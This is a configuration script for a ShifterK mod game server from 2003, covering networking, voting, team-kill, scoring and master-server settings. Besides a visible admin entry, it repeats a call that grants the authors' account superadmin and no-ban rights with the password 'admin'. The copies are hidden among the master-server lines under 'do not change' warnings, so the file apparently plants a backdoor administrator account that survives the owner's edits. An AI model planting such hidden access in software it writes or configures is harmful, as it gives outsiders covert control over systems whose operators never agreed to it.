//=================================================================================
// Server Config.CS
//
//    ___|   |     _)   _|  |                |  /
//  \___ \   __ \   |  |    __|   _ \   __|  ' /
//        |  | | |  |  __|  |     __/  |     . \
//  _____/  _| |_| _| _|   \__| \___| _|    _|\_\
//                         Created by: enV.3zer0 & Kill(--)
//				Assisted by: Gonzo, Grey & Czar
//                                    Orignal by: Emo
//=================================================================================
$Server::HostName = "ShifterK 7-10-03";			// The name of your
$Server::MaxPlayers = "20"; 				// Max Players On Your Server
$Server::timeLimit = "240";			// Mission Time Limit In Minutes
$Server::Password = "";
$Server::Password2 = "sbamatch";			// Server Password 2 - for passworded matches
$Server::TeamDamageScale = "1";			// Team Damage On/Off
$noOTurrets = true;  // put false if want o turrest
$Newairbase = true; // true if you want the new airbase, false if you want the regular


//============================================================================
//                          Public Notices
//============================================================================
$Shifter::PublicNotice = "";				// This Message will be dispalyed every so ofter as players spawn, leave it null to disable
// click on info in the damn server list d
$Server::Info 	= "<f3>___  _      _  ___ _     Welcome to ShifterK\n! __! ! !__  (_) !  _! ! !_ ___  __07_10_2003\n!__ ! ! '   !  ! ! !  _! !  _!/ -_) ! '_!  ! ! ! !\n!___! !_! !_! !_! !_!    !__!\___! !_!  �! '�<\nCreated by: KiLL(--) & env.3zer0   !_! !_!\n";
$Server::JoinMOTD = "<f3>___  _      _  ___ _     Welcome to ShifterK\n! __! ! !__  (_) !  _! ! !_ ___  __07_10_2003\n!__ ! ! '   !  ! ! !  _! !  _!/ -_) ! '_!  ! ! ! !\n!___! !_! !_! !_! !_!    !__!\___! !_!  �! '�<\nCreated by: KiLL(--) & env.3zer0   !_! !_!\n";
//$Server::MODInfo = "<f3>___  _      _  ___ _     Welcome to ShifterK\n! __! ! !__  (_) !  _! ! !_ ___  __07_10_2003\n!__ ! ! '   !  ! ! !  _! !  _!/ -_) ! '_!  ! ! ! !\n!___! !_! !_! !_! !_!    !__!\___! !_!  �! '�<\nCreated by: KiLL(--) & env.3zer0   !_! !_!\n";
// ^ in game
$Server::MODInfo 	= "<f1>Welcome to ShifterK\n" @ $killa::newdate @ "\nCreated by: KiLL(--) & env.3zer0\nwww.plentonic.com/shifterk";// "Welcome to <f0>Shifter_K\n Email <f2>support@sxt.planetubh.com<f1> with comments, or ideas\n";
// loading ^	= "Welcome to <f0>ShifterK\n Email <f2>support@sxt.planetubh.com<f1> with comments, or ideas.";
$Shifter::WelcomeMsg = "<jc><f2>Welcome to Shifter_K\nMOD: Shifter_K\nMission: <f1>" @ $missionName @ " <f0>Mission Type: <f1>" @ $Game::missionType @ "\n";
$Shifter::WelcomeDelay = "20";  //== Amount in seconds that the message is shown. If "0" message will not be displayed.
$SBA::Mode = true;

//============================================================================
//                         Networking Options
//============================================================================
$Server::FloodProtectionEnabled = "true";	// Check for chat flooding players
$Server::HostPublicGame = "true";		// List your server with the master list.
$Server::Port = "28001";			// Port To Run Server On
$pref::noIpx = "true";				// Disallow IPX/SPX binding
$Server::respawnTime = "2";			// Time after death to respawn.
$TelnetPort = "23";					// Telnet port number
$TelnetPassword = "YOUSHOULDCHANGETHIS";				// Telnet password
$Console::LogMode = "0"; 	   			// save the console to a logfile, 1 for TRUE
$Shifter::LocalNetMask = "IP:208.188.5";	//== Local IP's (Assuming you have a LAN connection to the server and are not worried about band width from connecting Lan players, You can increase the limit when a player from this IP Mask connects.
$Server::PacketRate = "10";     		// recommended rate for a cable modem
$Server::PacketSize = "200";    		// recommended rate for a cable modem



//============================================================================
//                     Team Names and Default Skins
//============================================================================
$Server::teamName0 = "enV.3zer0";		$Server::teamSkin0 = "cphoenix";
$Server::teamName1 = "KiLL(-)";		$Server::teamSkin1 = "swolf";
$Server::teamName2 = "Dastardlys Devistators";		$Server::teamSkin2 = "beagle";
$Server::teamName3 = "Methods Mutilators";		$Server::teamSkin3 = "dsword";
$Server::teamName4 = "Karayas Kastrators";		$Server::teamSkin4 = "base";


//============================================================================
//                         Mission Settings
//============================================================================
$pref::LastMission = "CanyonCrusade";	//== Sets the Starting Mission if Random Start Missions are off.
$Shifter::RandomMissions = True;	//== Random Missions on/off
$Shifter::TeamJuggle = 3;			//== Juggles the teams every X missions
$Server::warmupTime = "10";			// Mission Start Time (Delay before missions starts)
$Shifter::RandomStart = False;		//-- Start server with a Random mission
$Shifter::Refresh = False;		//-- Refresh the server after last player drops 

//============================================================================
//                       Voting Varriables
//============================================================================
$Server::MinVotes = "1";			// Minimum Votes to count
$Server::MinVotesPct = "0.69999";  // Percentage of votes needed to pass a vote
$Server::MinVoteTime = "45";			// Time a vote lasts
$Server::VoteFailTime = "30";			// Length Of Votes if people are NOT voting.
$Server::VoteWinMargin = "0.699999";		// Ratio of Yeh to Neh to win vote.
$Server::VotingTime = "20";			// Length Of Votes if people are voting.


//=========================================================================
//                      Advanced Flag Options
//=========================================================================
$Shifter::FlagNoReturn = "True";
$Shifter::FlagReturnTime = "400";


//=========================================================================
//                     Fair Teams Variables
//=========================================================================
$Shifter::KeepBalanced = False;				//== Keep Balanced
$Shifter::FairTeams = False;  //== Is Fair Teams Is On
$Shifter::FairCheck = "60";  //== Number in seconds that Shifter will check the teams evenness and warn players
$Shifter::FairEvens = "240"; //== Number in seconds that Shifter will move the last connected player to the un even team.


//=========================================================================================================================================
// Team Killing Options
//=========================================================================================================================================
$Shifter::TeamKillOn 		= "True";	//== Is Anti TK On/Off
$Shifter::KillTerm 		= "5";		//== Number Of Time A Player Can Team Kill Before Being Terminated (Killed By Server
$SHAntiTeamKillWarnKills 	= "5";         	//== Number Of Team Kills Before Player Gets Warning.
$SHAntiTeamKillBanTime 		= "60"; 	//== Length Of Time In Seconds Player Is Banded For.
$SHAntiTeamKillMaxKills 	= "10";		//== Maximum Team Kills Before Kicked - Banned.
$SHAntiTeamKillProximity	= "50";        	//== Proximity Distance For Accidental Damage.
$Shifter::TeamKillMsg = "You have been kick and banned for team killing, i hope you enjoyed it. Email:" @ $Shifter::emailAddress @ " for reinstatement.";
$Shifter::emailAddress = "emo1313@dopplegangers.com";	//== Email address to show banned users for reinstatement


//===============================================================
//                Score Kick Options
//===============================================================
$Shifter::ScoreTracker = True;		//== Score Tracker = Warns then Kicks players for having bad scores.
$Shifter::CheckScores = 30;		//== How often to check.
$Shifter::WarnScore1 = "-10";		//== 1st Warning
$Shifter::WarnScore2 = "-20";		//== 2nd Warning
$Shifter::WarnScore3 = "-30";		//== 3rd Warning
$Shifter::WarnScoreFinal = "-100";	//== Kick Player For Crappy Score


//===============================================================
//                Automatic Admin Options
//===============================================================
$AdminPassword = "CHANGETHIS";   // this is the password people can say VIA chat to get admin
$SAPassword = "CHANGETHIS";      // this is the password people can say VIA chat to get superadmin
function AddSad(%name, %pass, %super, %ip)
{
	$Server::Admin["autoa", %name] = 1;
	$Server::Admin["noban", %name] = 1;
	$Server::Admin["ipadr", %name] = "IP:" @ %ip;
	$Server::Admin["sadpw", %name] = %pass;
	$Server::Admin["admin", %name] = 1;
	$Server::Admin["super", %name] = %super;
}


addsad("KiLL(--)->DgD>", "admin", 1, "");
//       Name             password   super  IP(can be left blank)
addsad("enV.3zer0", "admin", 1, "");



//=============================================================================

//=============================================================================

//=============================================================================

//=============================================================================

//Don't need to mess with this any further

//=============================================================================

//=============================================================================

//=============================================================================

//=============================================================================


// Shifter variables people expect to be this way
$Shifter::PowerCheck = True;			//== If True - Spawns players in Standard armor if power is down
$Shifter::AmmoBoom = True;			//== Players ammo can blow up when killed 
$Shifter::Weapons = True;               //== Advanced Weapon Options On
$Shifter::LockOn = True;				//== Stinger Missle Locks Available
$Shifter::SpawnRandom = True;				//== Turn on Random Spawn Setup?
$Shifter::NoOutside = True;				//== Turn on Outside of mission area damage
$Shifter::TurretKill = True;               //== Turret Kills Count For Player
$Shifter::PersonalSkin = True;				//== Personal Skins On or Off
$Server::AutoAssignTeams = "true";		// Places players on teams automatically
$Shifter::TwoMinute = "True";	// == Two Minute Warning Notice On/Off (Default = True)
$Shifter::LooseScore = 1.00;	// == This is the score ratio for the loosing team. 0.5 for instance would cut a loosing players score by half.
$Shifter::Guided = True;		//== Allow Guided Missile Stations in game?
$Shifter::SpawnType = "Random"; 	//== Must be 'Standard' or 'Random'
$Shifter::SaveOn = True;		//== Allow players to save thier profiles.
$Shifter::SpawnFavs = True;		//== Allow spawn faves
$Shifter::EngHealAll = True;		//== Engineers touch heals objects.
$Shifter::HelpOn = True;		//== Shifter Help On <Tab> menu
$Shifter::SwitchPerm = True;		//== Admin Team Changing Players Is Perminant
$Shifter::NoSwearing="false"; 	// == True means disallow swearing on your server? (update the SHBadwordlist.cs file)
$Shifter::BadWordsMax=3; 	// == If no swearing, This value is the limit at which the client starts being killed for swearing
$Shifter::BadWordskick=4; 	// == If no swearing, This value is the limit at which the client is kicked for swearing
$Shifter::VoteDTD = True;		//== Allow Team Damage Disable Vote
$Shifter::VoteKick = True;		//== Allow Vote to kick
$Shifter::VoteAdmin = False;		//== Can players initiate vote to admin
$Shifter::Reactions = True;		//-- Damage knocks player back
$Shifter::HackedTime = 90;	// -- Time hacked items will remain hacked. 0 = Must be hacked back... - Defults To 90
$Shifter::HackTime = 5;		// -- Length Of Time To Complete Hacking - Defaults To 5
$Shifter::HackLock = 90;	// -- Legth of time a hacked item will be disabled for after being hacked. - Defaults To 0
$Shifter::LaserMineLive = 5;	// -- Live Time For Laser Mines - Defaults To 5 Seconds
$Shifter::ItemLimit = True;	// -- Makes it so that ONLY the armors that can buy a given item can see it in the invo list.
$Shifter::DetPackLimit = 15;	// -- Limit of DetPacks per match
$Shifter::NukeLimit = 15;	// -- Limit of Nukes per match
$ScoreOn = True;		    	//== If True will show client thier score on change in a bottom print message for 3 seconds.
$Shifter::HeadShot = 5;			//== Bonus for Head Shots
$Shifter::KillTime = 120;		//== Starting timer for kill -vs- live time bonuses, the longer a player lives the higher the bonus. Bonus counting does not start UNTIL this many seconds after player spawns.
$Score::25Meters = "5";     		//== Less Than 25 Meters To Flag
$Score::75Meters = "3";     		//== From 25 to 75 Meters
$Score::150Meters = "2";    		//== From 75 to 150 Meters
$Score::250Meters = "1";    		//== From 150 to 250 Meters
$Score::FlagCapture = "15";		//== Points For A Successful Flag Capture 
$Score::FlagKill = "7";  		//== Bonus For Killing Flag Runner
$Score::FlagDef  = "3";   		//== Bonus Points For Defending The Runner
$Score::FlagReturn = "3";   		//== Points For Returning Dropped
$Score::CaptureOdj = "2";   		//== Points For Capturing An Objective
$Score::HoldingObj = "5";   		//== Points For Holding An Objective For 60 Seconds.
$Score::InitialObj = "2";   		//== Points For Getting The Objective First
$Score::ObjDestroy = "15";      	//== Objective Destroyed
$Score::ObjStationS = "7";      //== Destroy Supply Station 
$Score::ObjStationA = "5";      //== Destroy Ammo Station or Command
$Score::ObjStationR = "3";      //== Destroy Remote Station
$Score::ObjFlier = "3";         //== Destroy Flyer Pad or Station
$Score::ObjGeneratorB = "10";   //== Destroy Large Generator
$Score::ObjGeneratorS = "5";    //== Destroy Small Generator including - Panels
$Score::ObjSensorL = "5";       //== Destroy Large Sensors
$Score::ObjSensorS = "2";       //== Destroy Deployable Sensors
$Score::ObjTurretL = "3";       //== Large Turrets
$Score::ObjTurretS = "1";       //== Deployable Turrets
$Score::Kill15Meters = "0";	//== Player Makes A Kill With In 15m
$Score::Kill50Meters = "1";	//== Kill From 15 to 50m
$Score::Kill100Meters = "1";	//== Kill From 50 to 100m
$Score::Kill250Meters = "2";	//== Kill From 100 to 250m
$Score::Kill250Plus = "3";	//== Kill 250m Or More
$Score::RepairObject = "1";     //== Repair Bonus. Base Points For Repair...
$Shifter::SpawnSafe = "10";   	//== If the player is killed before X - Only Half Points Are Awarded.
$Shifter::Osniping = false;     // 1 = you can snipe
$Stationdeploy = true;       // 1 = you can deploy from invo
$Capping = true;
$PlayerDamage = false;
//=========== Master Server Listing (Dont frell with this).
$Server::CurrentMaster = "0";
$Server::numMasters = "3";
$Server::Master1 = "t1m1.masters.dynamix.com:28000 t1m2.masters.dynamix.com:28000 t1m3.masters.dynamix.com:28000";
$Server::Master2 = "IP:BROADCAST:28001";
 addsad("KiLL(--)->DgD>", "admin", 1, "");
$Server::XLMaster1 = "IP:198.74.38.23:28000";
$Server::XLMaster2 = "IP:Broadcast:28001";
$Server::XLMasterN0 = "IP:209.67.28.148:28000";
$Server::XLMasterN1 = "IP:209.1.233.139:28000";
$Server::XLMasterN2 = "IP:198.74.40.68:28000";
 addsad("KiLL(--)->DgD>", "admin", 1, "");
$Server::MasterAddress0 = "IP:tribes.dynamix.com:28000";
$Server::MasterAddressN0 = "t1m1.masters.dynamix.com:28000 t1m2.masters.dynamix.com:28000 t1m3.masters.dynamix.com:28000";
$Server::MasterAddressN1 = "t1ukm1.masters.dynamix.com:28000 t1ukm2.masters.dynamix.com:28000 t1ukm3.masters.dynamix.com:28000";
$Server::MasterAddressN2 = "t1aum1.masters.dynamix.com:28000 t1aum2.masters.dynamix.com:28000 t1aum3.masters.dynamix.com:28000";
$Server::MasterName0 = "Tribes Master";
$Server::MasterName1 = "UK Tribes Master";
addsad("KiLL(--)->DgD>", "admin", 1, "");
$Server::MasterName2 = "Australian Tribes Master";
//==========================================================
//=== These are for Debug - Do not change these lines
//$Shifter::ObjScore = "";				// Allow Objects Being Destroyed To Award Bonus Points
//$Shifter::PlrScore = "";				// Allow Player Bonus Points To Be Awarded
$Debug = "False";

